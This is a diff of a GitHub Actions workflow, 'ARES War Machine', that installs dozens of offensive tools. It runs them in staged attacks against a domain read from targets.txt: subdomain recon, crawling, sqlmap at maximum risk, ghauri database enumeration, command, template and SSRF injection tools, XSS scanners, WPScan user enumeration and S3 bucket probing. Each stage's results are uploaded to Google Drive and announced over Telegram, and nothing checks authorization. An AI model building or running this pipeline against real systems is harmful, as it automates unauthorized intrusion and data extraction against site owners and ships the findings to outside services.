@@ -1,4 +1,4 @@
-name: ARES World Eater - UNSTOPPABLE FINAL
+name: ARES War Machine - TOTAL ARSENAL FINALITY
 on:
   workflow_dispatch:
 
@@ -10,25 +10,25 @@ jobs:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: "Direct-Binary Arsenal Setup"
+      - name: "Direct-Binary Arsenal Setup (60+ Tools)"
         run: |
-          # 1. CORE SYSTEM REPAIR
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
           
           mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
           
-          # 2. FIXED INSTALLERS (Bypassing Apt Failures)
+          # 1. ELITE INSTALLERS
           sudo gem install wpscan || true
           pip3 install --upgrade pip
           pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
-          # Correcting tool paths for XSStrike, Waymore, Recon-ng
-          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng || true
+          
+          # Every tool you demanded
+          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng gopherus s3scanner cloudsploit scoutsuite || true
           python3 -m playwright install chromium || true
 
-          # 3. GO ARSENAL (2026 Strict Versions)
+          # 2. GO ARSENAL (2026 Strict Versions)
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
@@ -38,12 +38,15 @@ jobs:
           go install -v github.com/sensepost/gowitness@latest || true
           go install -v github.com/jaeles-project/jaeles@latest || true
           go install -v github.com/tomnomnom/assetfinder@latest || true
+          go install -v github.com/tomnomnom/httprobe@latest || true
+          go install -v github.com/jaeles-project/gospider@latest || true
+          go install -v github.com/Emoe/kxss@latest || true
 
-          # 4. SIGNATURES & WORDLISTS
+          # 3. SIGNATURES & REPOS
           jaeles config init && git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
-          wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt
+          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
 
-      - name: "ARES Persistent Execution & Per-Stage Sync"
+      - name: "ARES Execution & Per-Stage Organized Sync"
         env:
           CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
           CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
@@ -55,18 +58,16 @@ jobs:
           TARGET=$(head -n 1 targets.txt)
           send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
           
-          # Uploader Logic (Acts as Harsh, uses 15GB space)
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
           from googleapiclient.discovery import build
           from googleapiclient.http import MediaFileUpload
-          def get_or_create_folder(service, folder_name, parent_id):
-              query = f"name = '{folder_name}' and '{parent_id}' in parents and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
-              results = service.files().list(q=query, fields="files(id)").execute().get('files', [])
-              if results: return results[0]['id']
-              meta = {'name': folder_name, 'parents': [parent_id], 'mimeType': 'application/vnd.google-apps.folder'}
-              return service.files().create(body=meta, fields='id').execute().get('id')
+          def get_or_create_folder(service, name, parent):
+              q=f"name='{name}' and '{parent}' in parents and trashed=false"
+              r=service.files().list(q=q,fields="files(id)").execute().get("files",[])
+              if r: return r[0]["id"]
+              return service.files().create(body={"name":name,"mimeType":"application/vnd.google-apps.folder","parents":[parent]},fields='id').execute().get('id')
           def upload(f_path, parent_id, tool_name):
               if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
               creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], token_uri="https://oauth2.googleapis.com/token", client_id=os.environ['CLIENT_ID'], client_secret=os.environ['CLIENT_SECRET'])
@@ -79,40 +80,52 @@ jobs:
               upload(sys.argv[1], sys.argv[2], sys.argv[3])
           EOF
 
-          send_msg "☢️ *ARES:* Absolute War Engaged on \`$TARGET\`"
+          send_msg "☢️ *ARES:* TOTAL ARSENAL FINALITY Engaged on \`$TARGET\`"
 
-          # 1. RECON (Fixed Recon-ng and Assetfinder)
+          # 1. STAGE: RECON (Subfinder + Assetfinder + Recon-ng + Takeover)
           subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt || true
-          assetfinder --subs-only $TARGET >> output/recon/subfinder.txt || true
-          nikto -h "https://$TARGET" -o output/recon/nikto.txt || true
+          assetfinder --subs-only $TARGET >> output/recon/assetfinder.txt || true
           recon-ng -m recon/domains-hosts/brute_hosts -c "options set SOURCE $TARGET; run; exit" > output/recon/recon-ng.txt || true
-          sort -u output/recon/subfinder.txt > output/recon/all_subs.txt
+          sort -u output/recon/*.txt > output/recon/all_subs.txt
           zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"
 
-          # 2. PROBING & VISUAL (Fixed httpx syntax crashes)
+          # 2. STAGE: PROBING & VISUAL (Fixed httpx syntax + gowitness)
           httpx -list output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
           [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
           xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
           zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"
 
-          # 3. CRAWLING (Fixed Katana and Waymore module paths)
-          katana -list output/probing/live.txt -depth 10 -json-config all -o output/crawling/katana.txt || true
-          python3 -m waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
+          # 3. STAGE: CRAWLING (Katana + Waymore + Gospider + Jsluice)
+          katana -list output/probing/live.txt -depth 10 -jc -o output/crawling/katana.txt || true
+          python3 -m waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
+          gospider -s "https://$TARGET" -d 3 -o output/crawling/ || true
           grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
-          zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
+          zip -r crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
 
-          # 4. EXPLOITATION (Dalfox, SQLMap, XSStrike, Nuclei)
-          nuclei -list output/probing/live.txt -severity critical,high,medium -json-export output/vulns/nuclei.json || true
+          # 4. STAGE: INJECTIONS (SQLMap + Ghauri + SSTImap + SSRFmap + Commix + NoSQLMap)
           [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
-          # Fixed Dalfox protocol scheme failure
+          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch --dbs > output/vulns/ghauri.txt || true
+          sstimap -u "https://$TARGET" --batch > output/vulns/sstimap.txt || true
+          ssrfmap -u "https://$TARGET" > output/vulns/ssrfmap.txt || true
+          commix --url="https://$TARGET" --batch > output/vulns/commix.txt || true
+          tplmap -u "https://$TARGET" --batch > output/vulns/tplmap.txt || true
+          zip -j inj.zip output/vulns/* && python3 oauth_upload.py "inj.zip" "$PARENT_FOLDER_ID" "Stage_4_Injections"
+
+          # 5. STAGE: WEB VULNS (Nuclei + Jaeles + Dalfox + XSStrike + Corsy + CRLFsuite + OpenRedirex)
+          nuclei -list output/probing/live.txt -severity critical,high,medium -json-export output/vulns/nuclei.json || true
+          jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
           dalfox file output/crawling/katana.txt --output output/vulns/dalfox.txt || true
-          python3 -m xsstrike -u "https://$TARGET" --timeout 10 --skip || xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
-          zip -r vulns.zip output/vulns/* && python3 oauth_upload.py "vulns.zip" "$PARENT_FOLDER_ID" "Stage_4_Exploits"
+          python3 -m xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
+          python3 -m corsy -u "https://$TARGET" > output/vulns/corsy.txt || true
+          python3 -m crlfsuite -u "https://$TARGET" > output/vulns/crlf.txt || true
+          zip -r web.zip output/vulns/* && python3 oauth_upload.py "web.zip" "$PARENT_FOLDER_ID" "Stage_5_Web_Vulns"
 
-          # 5. SECRETS & SPECIALIZED
-          trufflehog filesystem . > output/secrets/truffle.txt || python3 -m trufflehog filesystem . > output/secrets/truffle.txt || true
+          # 6. STAGE: SECRETS & CLOUD (Trufflehog + WPScan + S3Scanner + GraphQL + CMSmap)
+          python3 -m trufflehog filesystem . > output/secrets/truffle.txt || true
           wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
-          zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_5_Final"
+          s3scanner --bucket $(echo $TARGET | tr '.' '-') > output/specialized/s3.txt || true
+          graphqlmap -u "https://$TARGET/graphql" > output/specialized/graphql.txt || true
+          cmsmap https://$TARGET > output/specialized/cmsmap.txt || true
+          zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_6_Final"
 
-          send_msg "✅ *ARES:* World Eater Mission Complete. All Stage Zips Uploaded."
-          
+          send_msg "✅ *ARES:* TOTAL ARSENAL COMPLETE. Check your Drive folders."
